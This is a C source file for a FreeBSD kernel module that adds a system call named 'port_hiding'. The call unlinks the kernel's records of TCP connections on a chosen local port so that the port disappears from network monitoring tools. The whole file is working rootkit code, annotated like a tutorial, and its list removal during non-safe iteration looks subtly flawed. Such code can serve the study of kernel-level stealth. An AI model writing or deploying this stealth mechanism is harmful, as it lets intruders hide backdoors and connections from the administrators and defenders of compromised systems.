#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>

#include <net/if.h>
#include <net/vnet.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

#define AUE_NULL 0

struct port_hiding_args {
	u_int16_t lport;		/* local port */
};

/* System call to hide an open port */
static int port_hiding (struct thread *td, void *syscall_args)
{
	struct port_hiding_args *uap;
	uap = (struct port_hiding_args *) syscall_args;

	/* We have to change context of the current virtual network instance.
	 * The unrestricted default network stack for the system is vnet0 */
	CURVNET_SET(vnet0);
	/* Access control mechanism for the V_tcbinfo object we need to modify */
	INP_INFO_WLOCK(&V_tcbinfo);

	struct inpcb *inpb;

	/* Iterate through the TCP-based inpcb list */
	/* inpb is the kobject for each active connection */
	/* inp_list contains the linkage pointers that are associated with the inpcb struct */
	/* V_tcbinfo.ipi_listhead is a field containing the list of inpcb structs (inpb) */
	CK_LIST_FOREACH(inpb, V_tcbinfo.ipi_listhead, inp_list) {
		/* When a TCP connection is closed, a final ACK is sent.
		 * The system is then in a 2MSL wait state for twice the maximum 
		 * segment lifetime. This way, we can resend the final ACK if the first 
		 * was lost. We can check to see if the connection we are on is int his state - 
		 * why bother hiding a port if its about to close? */
		if (inpb->inp_vflag & INP_TIMEWAIT)
			continue;

		/* We have a separate access control mechanism for each inpcb struct */
		INP_RLOCK(inpb);

		/* Do we want to hide this local open port? */
		/* inpb->inp_inc is an in_comminfo struct containing flags, connection tuple, etc
		 * inpb->inp_inc.inc_lport is a macro for inpb->inp_inc.inc_ie.ie_lport */
		if (uap->lport == ntohs(inpb->inp_lport))
		{
			CK_LIST_REMOVE(inpb, inp_list);
		}

		INP_RUNLOCK(inpb);
	}

	INP_INFO_WUNLOCK(&V_tcbinfo);
	/* We have to restore the virtual network now that we're done modifying it */
	CURVNET_RESTORE();

	return(0);
}

/* The sysent for the new system call */
static struct sysent port_hiding_sysent = {
	1, 		/* number of arguments */
	port_hiding	/* implementing function */
};

/* The offset in sysent[] where the syscall is to be allocated */
static int offset = NO_SYSCALL;		// First available

/* The function called at load/unload */
static int load (struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch(cmd)
	{
		case MOD_LOAD:
			uprintf("System call loaded at offset %d.\n", offset);
			break;

		case MOD_UNLOAD:
			uprintf("System call unloaded from offset %d.\n", offset);
			break;

		default:
			error = EOPNOTSUPP;
			break;

	}

	return(error);

}

SYSCALL_MODULE(port_hiding, &offset, &port_hiding_sysent, load, NULL);
